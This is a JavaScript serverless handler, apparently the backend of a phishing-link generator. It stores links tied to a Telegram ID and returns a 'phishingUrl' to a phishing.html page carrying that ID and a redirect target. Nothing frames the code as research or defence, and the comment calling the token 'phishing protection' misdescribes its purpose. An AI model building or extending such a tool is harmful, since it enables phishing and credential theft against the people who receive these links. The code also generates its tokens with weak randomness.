import { kv } from '@vercel/kv';

export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, redirectUrl } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Validate inputs
    if (!telegramId || !redirectUrl) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Rate limiting (10 links/day per IP)
    const ipKey = `rate_limit:${ip}`;
    const linkCount = (await kv.get(ipKey)) || 0;
    if (linkCount >= 10) {
      return res.status(429).json({ 
        error: 'Daily limit exceeded (10 links max)' 
      });
    }

    // Generate unique codes
    const token = generateRandomString(32); // For phishing protection
    const shortCode = await generateUniqueShortCode();

    // Store data
    await kv.set(`short:${shortCode}`, {
      originalUrl: redirectUrl,
      telegramId,
      token,
      createdAt: Date.now(),
      clicks: 0
    }, { ex: 86400 * 7 }); // Expire in 7 days

    // Increment rate limit counter
    await kv.incr(ipKey);
    await kv.expire(ipKey, 86400); // Reset counter in 24h

    // Return both URLs
    res.status(200).json({
      shortUrl: `https://${req.headers.host}/s/${shortCode}`,
      phishingUrl: `https://${req.headers.host}/phishing.html?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`,
      expiresAt: Date.now() + 86400 * 7
    });

  } catch (error) {
    console.error('Generation error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};

// Helper functions
function generateRandomString(length) {
  return [...Array(length)].map(() => Math.random().toString(36)[2]).join('');
}

async function generateUniqueShortCode() {
  let shortCode;
  let attempts = 0;
  do {
    shortCode = generateRandomString(6);
    attempts++;
    if (attempts > 5) throw new Error('Failed to generate unique short code');
  } while (await kv.exists(`short:${shortCode}`));
  return shortCode;
}
